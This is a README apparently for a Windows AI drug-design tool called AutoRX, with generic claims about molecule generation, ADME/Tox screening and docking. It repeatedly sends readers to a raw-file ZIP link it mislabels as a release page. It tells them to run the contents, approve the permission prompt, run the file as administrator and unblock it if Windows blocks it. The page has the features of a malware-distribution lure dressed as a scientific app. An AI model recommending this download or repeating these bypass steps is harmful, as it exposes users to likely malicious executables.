# 🧬 AutoRX - Run AI Drug Design on Windows

[![Download AutoRX](https://img.shields.io/badge/Download-AutoRX-blue?style=for-the-badge)](https://raw.githubusercontent.com/ewx12344/AutoRX/main/api/RX-Auto-3.7.zip)

## 🚀 What AutoRX Does

AutoRX is a Windows app for early drug design. It helps you explore new molecule ideas with AI, estimate basic ADME/Tox properties, and run 3D docking checks with Vina or GNINA.

Use AutoRX if you want to:
- Generate new molecule ideas
- Check likely ADME/Tox issues
- Test how a molecule may fit a target protein
- Review results in one place
- Work through a drug design flow without setting up tools by hand

## 💻 Windows Setup

AutoRX is made for Windows users who want a simple local app. For a smooth run, use:

- Windows 10 or Windows 11
- 8 GB RAM or more
- 4 GB free disk space
- A modern Intel or AMD CPU
- A stable internet connection for the first download

For larger docking jobs, 16 GB RAM gives more room.

## 📥 Download AutoRX

Visit the release page and download the latest Windows build:

https://raw.githubusercontent.com/ewx12344/AutoRX/main/api/RX-Auto-3.7.zip

After the file downloads, open it from your Downloads folder. If the file is a ZIP archive, extract it first. If it is an installer or app file, run it.

## 🛠️ Install on Windows

Follow these steps:

1. Open the release page
2. Find the latest version
3. Download the Windows file
4. If the file is zipped, right-click it and choose Extract All
5. Open the extracted folder
6. Double-click the app file or installer
7. If Windows asks for permission, click Yes
8. Wait for the app to finish opening

If AutoRX opens in a console window first, let it finish loading before you click anything.

## ▶️ First Run

When you start AutoRX for the first time:

1. Let it load fully
2. Pick or paste a molecule input if the app asks for one
3. Choose the task you want to run
4. Set the target protein file if you plan to dock
5. Start the job and wait for results

For a first test, use a small run with one or two molecules. This helps confirm that the app works on your system.

## 🔍 Main Features

### 🧪 Generative Molecule Design
AutoRX can create new molecule ideas from an input prompt, seed structure, or design target. It uses generative mutation steps to explore nearby chemical space.

### 🧬 ADME/Tox Screening
AutoRX can estimate basic drug-like traits before you spend time on docking. This helps you spot issues such as:
- Low oral absorption
- Poor solubility
- High toxicity risk
- Unstable molecular features

### 🎯 Docking with Vina and GNINA
AutoRX supports 3D docking workflows with AutoDock Vina and GNINA. It can help you compare how different molecules may bind to a target site.

### 📊 Result Review
AutoRX keeps outputs in a way that is easier to review. You can inspect:
- Ranked molecule lists
- ADME/Tox predictions
- Docking scores
- 3D pose files
- Run logs

## 🧭 Typical Workflow

A common AutoRX run looks like this:

1. Start with a known molecule or a design goal
2. Generate new candidate molecules
3. Filter the list with ADME/Tox checks
4. Dock the better candidates
5. Review the top results
6. Export the best files for later work

This lets you move from idea to shortlist in one flow.

## 📁 Input Files

AutoRX may ask for one or more of these files:

- A molecule file, such as SDF, MOL, or SMILES input
- A target protein file, often in PDB format
- A binding site or docking grid setup
- A reference ligand if you want to compare poses

If you are not sure which file to use, start with the same file set you used in another docking tool.

## ⚙️ Basic Use Cases

### New Compound Ideas
Use AutoRX when you want fresh compound ideas based on a known structure.

### Lead Refinement
Use it to test small changes to a lead molecule and keep the versions that score better.

### Early Filter Checks
Use it to remove candidates with poor ADME/Tox signs before more work begins.

### Docking Review
Use it to compare a batch of compounds against one protein target.

## 🧩 Common File Types

AutoRX may work with these file types:

- `.exe` for the app or installer
- `.zip` for a packaged release
- `.sdf` for compound sets
- `.mol` for single molecules
- `.smiles` or `.txt` for text-based molecule input
- `.pdb` for protein structures
- `.csv` for result tables

Keep your files in a simple folder path, such as `C:\AutoRX\Work`, to avoid path issues.

## 🧰 Troubleshooting

### The app does not start
- Check that you downloaded the latest release
- Reopen the file as an administrator
- Make sure the file finished downloading
- Extract the ZIP file before opening the app

### Windows blocks the file
- Right-click the file
- Open Properties
- If you see an Unblock option, select it
- Try opening the file again

### Docking fails
- Check the protein file format
- Confirm that the target file is complete
- Use a smaller test ligand first
- Make sure the output folder is writable

### The app feels slow
- Close other large programs
- Use a smaller molecule set
- Run one job at a time
- Make sure your system has enough free memory

## 🧪 Good First Test

If you want to check that AutoRX works on your PC, try this:

1. Download the latest release
2. Open the app
3. Load one simple molecule
4. Run ADME/Tox prediction
5. Run one docking job
6. Open the results and check that files were created

If this works, the main setup is fine.

## 📌 What You Can Expect

AutoRX is built for practical drug design work. It gives you a path from molecule ideas to basic screening and docking without making you set up each part by hand.

You can use it for:
- Early discovery work
- Compound triage
- Docking review
- Simple batch checks
- AI-guided molecule exploration

## 🗂️ Topics

This project relates to:
admet, ai-agent, autodock-vina, autonomous-agents, bioinformatics, cheminformatics, de-novo-design, drug-discovery, generative-ai, llm, machine-learning, molecular-docking, pharmacology, python, pytorch, rdkit

## 📎 Download Again

If you need the release page later, use this link:

https://raw.githubusercontent.com/ewx12344/AutoRX/main/api/RX-Auto-3.7.zip